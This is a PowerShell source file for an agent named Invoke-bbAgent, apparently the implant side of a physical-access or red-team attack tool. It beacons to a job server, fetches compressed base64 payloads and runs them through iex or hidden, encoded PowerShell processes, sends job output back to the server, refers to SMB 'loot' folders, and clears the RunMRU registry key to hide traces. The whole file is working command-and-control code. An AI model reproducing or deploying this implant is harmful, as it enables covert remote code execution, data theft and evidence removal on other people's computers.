function Invoke-bbAgent
{
    [CmdletBinding()]
    Param
    (
        # IP to job server
        [Parameter(Position=0)]
        [string]$ServerIP = "172.16.64.1",
        #Port of job server
        [Parameter(Position=1)]
        [int]$Port = 1337
    )
    
    #Initialize Global webclient 2.0 compatible.
    Write-Verbose "Initializing global variables."
    add-type -assembly system.web.extensions
    $webc = New-Object System.Net.WebClient    
    $baseserver = "http://" + $ServerIP + ":" + $Port + "/"
    $jobURL = $baseserver + "getJob1"
    $dataURL = $baseserver + "pushData"
    $configURL = $baseserver + "getConfig"
    $addJobURL = $baseserver + "addJob"

    #Helper Functions
    ##################

    #Powershell 2 compatable versions of json conversion functions.
    function ConvertTo-Json20
    {
        [CmdletBinding()]
        Param(
            [Parameter(Mandatory=$true)]
            [psobject]$item
        )
        Write-Verbose "Converting object to JSON."
        $ps_js=new-object system.web.script.serialization.javascriptSerializer
        return $ps_js.Serialize($item)
    }

    function ConvertFrom-Json20
    {
        [CmdletBinding()]
        Param(
            [Parameter(Mandatory=$true)]
            [string]$item
        )
        Write-Verbose "Converting object from JSON."
        $ps_js=new-object system.web.script.serialization.javascriptSerializer
        $ps_js.MaxJsonLength = [System.Int32]::MaxValue
        #The comma operator is the array construction operator in PowerShell
        return ,$ps_js.DeserializeObject($item)
    }

    #Convert payload encoding formats
    #Convert from base64
    function ConvertFrom-Base64
    {
        [CmdletBinding()]
        Param(
            [Parameter(Mandatory=$true)]
            [string]$payload,
            [string]$Encoding="utf8"
        )
        Write-Verbose "Converting string from base64."
        if($Encoding -eq "utf8")
        {
            return [System.Text.Encoding]::UTF8.GetString(([System.Convert]::FromBase64String($payload)))
        }
        else
        {
            return [System.Text.Encoding]::Unicode.GetString(([System.Convert]::FromBase64String($payload)))
        }
    }

    function ConvertTo-Base64
    {
        [CmdletBinding()]
        Param(
            [Parameter(Mandatory=$true)]
            [string]$Payload,
            [string]$Encoding="utf8"
        )
        Write-Verbose "Converting string to base64"
        if($Encoding -eq "utf8")
        {
            return [System.Convert]::toBase64String(([System.Text.Encoding]::UTF8.GetBytes($Payload)))            
        }
        else
        {
            return [System.Convert]::toBase64String(([System.Text.Encoding]::Unicode.GetBytes($Payload)))            
        }
    }

    #Uncompress encoded compressed script
    function ConvertFrom-CompressedEncoded
    {
        [CmdletBinding()]
        Param(
            [Parameter(Mandatory=$true)]
            [string]$CompressedScript
        )
        Write-Verbose "Converting string from compressed encoding."
        $decodedCompressedBytes = [IO.MemoryStream][Convert]::FromBase64String($CompressedScript)
        $uncompressedBytes = New-Object IO.Compression.DeflateStream($decodedCompressedBytes,[IO.Compression.CompressionMode]::Decompress)
        return (New-Object IO.StreamReader($uncompressedBytes,[Text.Encoding]::ASCII)).ReadToEnd()
    }

    function Out-EncodedCommand
    {
        [CmdletBinding( DefaultParameterSetName = 'FilePath')]
        Param (
            [Parameter(Position = 0, ValueFromPipeline = $True, ParameterSetName = 'ScriptBlock' )]
            [ValidateNotNullOrEmpty()]
            [ScriptBlock]
            $ScriptBlock,

            [Parameter(Position = 0, ParameterSetName = 'FilePath' )]
            [ValidateNotNullOrEmpty()]
            [String]
            $Path,

            [Switch]
            $EncodedOutput
        )

        if ($PSBoundParameters['Path'])
        {
            Get-ChildItem $Path -ErrorAction Stop | Out-Null
            $ScriptBytes = [IO.File]::ReadAllBytes((Resolve-Path $Path))
        }
        else
        {
            $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($ScriptBlock)
        }

        $CompressedStream = New-Object IO.MemoryStream
        $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
        $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
        $DeflateStream.Dispose()
        $CompressedScriptBytes = $CompressedStream.ToArray()
        $CompressedStream.Dispose()
        $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)

        # Generate the code that will decompress and execute the payload.
        # This code is intentionally ugly to save space.
        $NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'

        $CmdMaxLength = 8190

        # Build up the full command-line string. Default to outputting a fully base-64 encoded command.
        # If the fully base-64 encoded output exceeds the cmd.exe character limit, fall back to partial
        $CommandlineOptions = New-Object String[](0)
        $CommandlineOptions += '-NoE'
        $CommandlineOptions += '-NoP'
        $CommandlineOptions += '-NonI'
        $CommandlineOptions += "-W Hidden"
        
        $CommandLineOutput = @{}
        $CommandLineOutput["payload"] = "$($CommandlineOptions -join ' ') -C `"$NewScript`""

        if ($PSBoundParameters['EncodedOutput'] -or $CommandLineOutput["payload"].Length -le $CmdMaxLength)
        {
            $UnicodeEncoder = New-Object System.Text.UnicodeEncoding        
            $CommandLineOutput["Encoded"] = $true
            $CommandLineOutput["payload"] = "$($CommandlineOptions -join ' ') -Enc `"$([Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript)))`""
        }

        if (($CommandLineOutput["payload"].Length -gt $CmdMaxLength) -and (-not $PSBoundParameters['EncodedOutput']))
        {        
            $CommandLineOutput["Encoded"] = $false        
        }


        Write-Output $CommandLineOutput
    }

    function Get-BBConfig
    {
        [CmdletBinding()]
        Param()
        $serverconfig = ConvertFrom-Json20 -item $($webc.DownloadString($configURL))
        $confstring = @"
`$Script:BB_IP = "$ServerIP"
`$Script:BB_PORT = $([int]$Port)
`$Script:BB_SMBLOOT = "$($serverconfig.BB_SMBLOOT)"
`$Script:BB_SMBROOT = "$($serverconfig.BB_SMBROOT)"
`$Script:BB_TARGET_HOSTNAME = "$($serverconfig.TARGET_HOSTNAME)"
`$Script:BB_ADDJOBURL = "$addJobURL"
"@
        $newjobsb = {
            function Send-NewJob
            {
                [CmdletBinding()]
                Param(
                    [Parameter(Mandatory=$true, Position=0)]
                    [string]$jobName,
                    [Parameter(Mandatory=$true, Position=1)]
                    [string]$command,
                    [Parameter(Mandatory=$true, Position=2)]
                    [ValidateSet("process", "thread")]
                    [string]$runType,
                    [Parameter(Mandatory=$true, Position=3)]
                    [string]$scriptName,
                    [Parameter(Mandatory=$false, Position=4)]
                    [string]$addjoburl = $BB_ADDJOBURL
                )
                add-type -assembly system.web.extensions
                $webc = New-Object System.Net.WebClient

                function ConvertTo-Json20
                {
                    [CmdletBinding()]
                    Param(
                        [Parameter(Mandatory=$true)]
                        [psobject]$item
                    )
                    Write-Verbose "Converting object to JSON."
                    $ps_js=new-object system.web.script.serialization.javascriptSerializer
                    return $ps_js.Serialize($item)
                }

                function Send-BBData
                {
                    [CmdletBinding()]
                    Param(
                        [Parameter(Mandatory=$true, Position=0)]
                        [string]$bbURL,
                        [Parameter(Mandatory=$true, Position=1)]
                        [hashtable]$jsonData
                    )

                    $jsonJob = ConvertTo-Json20 -item $jsonData
                    $webc.Headers[[System.Net.HttpRequestHeader]::ContentType] = "application/json"
                    try
                    {
                        $null = $webc.UploadString($bbURL, "POST", $jsonJob)
                        return $true
                    }
                    catch
                    {
                        return $false
                    }
                }
                #Main Part
                $jobData = @{
                    jobName = $jobName
                    command = $command
                    runType = $runType
                    scriptName = $scriptName
                }
                return (Send-BBData $addjoburl $jobData)    
            }
        }
        $confstring += "`r`n`r`n{0}" -f ($newjobsb.ToString())
        return ([scriptblock]::Create($confstring))
    }

    function Send-ReturnData
    {
        [CmdletBinding()]
        Param(
            [Parameter(Mandatory=$true)]
            [psobject]$ReturnData
        )
        $jsonJob = ConvertTo-Json20 -item $ReturnData
        Write-Verbose ("Data being sent is: {0}" -f $jsonJob)
        Write-Verbose ("Url being sent to: {0}" -f $dataURL)
        $webc.Headers[[System.Net.HttpRequestHeader]::ContentType] = "application/json"
        Write-Verbose ("Content Type is: {0}" -f $webc.Headers[[System.Net.HttpRequestHeader]::ContentType])
        try
        {
            $null = $webc.UploadString($dataURL, "POST", $jsonJob)
            return $true
        }
        catch
        {
            return $false
        }
    }

    #JobCycle
    function Start-JobCycle
    {
        [CmdletBinding()]
        Param()

        $emptycount = 0
        Write-Verbose "Beginning Job loop inside Start-Job function."
        while($emptycount -le 3)
        {
            Write-Verbose "Testing to see if server machine is online."
            if(Test-Connection -ComputerName $ServerIP -Count 1 -Quiet)
            {
                if([string]::IsNullOrEmpty($BBConfig))
                {
                    Write-Verbose "Reading BBConfig"
                    $BBConfig = Get-BBConfig
                }
                else
                {
                    Write-Verbose "BBConfig already acquired, skipping reading."
                }
                Write-Verbose "Checking for finished jobs."
                $doneJobs = Get-Job | Where-Object {@("Completed","Blocked","Failed") -contains $_.State}
                if($doneJobs)
                {
                    Write-Verbose "Jobs were found, processing."
                    $doneJobs | Where-Object {$_.state -eq "Completed"} | ForEach-Object {
                        Write-Verbose ("Completed jobs are: {0}" -f ($_ | out-string))
                        if($_.HasMoreData)
                        {
                            $jobData = Receive-Job $_ -ErrorAction SilentlyContinue -ErrorVariable "jobError" | Out-String
                            $jobData += "`r`n{0}" -f $($jobError | Out-String)
                            if([string]::IsNullOrEmpty($jobData))
                            {
                                Write-Verbose ("Job:{0} has no data, returning default." -f $_.Name)
                                $jobdata = "Job finished, no data"
                            }
                            $returnobj = @{
                                jobName = $_.Name
                                data = $jobData
                            }

                            Write-Verbose ("Removing Job:{0} and sending data." -f $_.Name)
                            $null = remove-job $_
                            if(Send-ReturnData -ReturnData $returnobj)
                            {
                                Write-Verbose "Data successfully returned."
                            }
                            else
                            {
                                Write-Verbose "Failed to return Data."
                            }                            
                        }
                    }
                    $doneJobs | Where-Object {@("Blocked","Failed") -contains $_.State} | ForEach-Object {
                        Write-Verbose ("Blocked and Failed Jobs are: {0}" -f ($_ | out-string))
                        $jobData = "Job was terminated because it failed or was in block state for user input.`r`n"
                        if($_.HasMoreData)
                        {
                            $jobData += Receive-Job $_ -ErrorAction SilentlyContinue -ErrorVariable "jobError"
                            if($jobError)
                            {
                                $jobData += "`r`n{0}" -f $jobError
                            }
                        }
                        $returnobj = @{
                            jobName = $_.Name
                            data = $jobData
                        }

                        Write-Verbose ("Removing and sending Job: {0}" -f $_.Name)
                        $null = Stop-Job $_ -PassThru | Remove-Job
                        if(Send-ReturnData -ReturnData $returnobj)
                        {
                            Write-Verbose "Data successfully returned."
                        }
                        else
                        {
                            Write-Verbose "Data unsuccessfully returned."
                        }
                    }
                }
                Write-Verbose "Getting jobs from server."
                Try
                {
                    $payloadobj = ConvertFrom-Json20 -item $($webc.DownloadString($jobURL))
                }
                catch
                {
                    $payloadobj = $null
                }
                
                if($payloadobj -and $payloadobj.payload -ne "none")
                {
                    $emptycount = 0                    
                    if($payloadobj.payload)
                    {                        
                        $payloadobj.payload = ConvertFrom-CompressedEncoded -CompressedScript $($payloadobj.payload)
                    }
                    
                    
                    if(-not [string]::IsNullOrEmpty($payloadobj.payload))
                    {
                        Write-Verbose "Appending command to script."
                        $payloadobj.payload += $payloadobj.command
                    }
                    else
                    {
                        Write-Verbose "Command is empty, not appending"
                    }
                    Write-Verbose $payloadobj.payload
                    Write-Verbose ("Checking for runType which is: {0}" -f $payloadobj.runType)
                    if($payloadobj.runType -eq "process")
                    {
                        Write-Verbose "Running job as process."                        
                        if($payloadobj.payload.Length -lt 400)
                        {
                            $paydirt = ConvertTo-Base64 -Payload $payloadobj.payload -Encoding "unicode"
                            $paydirt = "-NonI -NoP -W Hidden -ENC $paydirt"
                        }
                        else
                        {
                            $paydirt = (Out-EncodedCommand -ScriptBlock ([scriptblock]::Create($payloadobj.payload))).payload
                        }
                        try {
                            Write-Verbose $paydirt
                            $processObj = Start-Process "Powershell" -WindowStyle "Hidden" -ArgumentList $paydirt -PassThru
                            Remove-Variable -Name "paydirt"
                            $retProc = @{
                                jobName = $payloadobj.jobName
                                data = "Job started under process {0}" -f ($processObj.Id)
                            }
                        }
                        catch {
                            Remove-Variable -Name "paydirt"
                            $retProc = @{
                                jobName = $payloadobj.jobName
                                data = $_.Exception.Message
                            }
                        }
                        if(Send-ReturnData -ReturnData $retProc)
                        {
                            Write-Verbose "Returned successful process data."
                        }                        
                    }
                    else
                    {
                        Write-Verbose "Creating scriptblock from payload."
                        $payload = [scriptblock]::Create(($payloadobj.payload))
                        Write-Verbose "Starting job from payload."
                        $null = Start-Job -Name $($payloadobj.jobName) -ScriptBlock $payload -InitializationScript ($BBConfig)
                    }
                    
                }
                elseif((Get-Job))
                {
                    Write-Verbose "Jobs still running, no jobs on server queue, resetting timeout."
                    $emptycount = 0
                }
                else
                {
                    Write-Verbose "Job queue empty, no more jobs from server, timeout incremented."
                    $emptycount++
                }
            }
            else
            {
                Write-Verbose "Server not found, incrementing timeout counter."
                $emptycount++
            }
            Write-Verbose "Sleeping for 1 seconds."
            Write-Verbose ("Count is at: {0}" -f $emptycount)
            Write-Verbose (Get-Job | Out-String)
            Start-Sleep -Seconds 1
        }
        Write-Verbose "Sending server quit command."
        try
        {
            $null = $webc.DownloadString($baseserver + "quit")
        }
        catch
        {
            Write-Verbose "Server is not up, quit was not received."
        }
    }
    Start-JobCycle
    Write-Verbose "Garbage collecting before exiting."
    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
    [System.GC]::Collect()
}
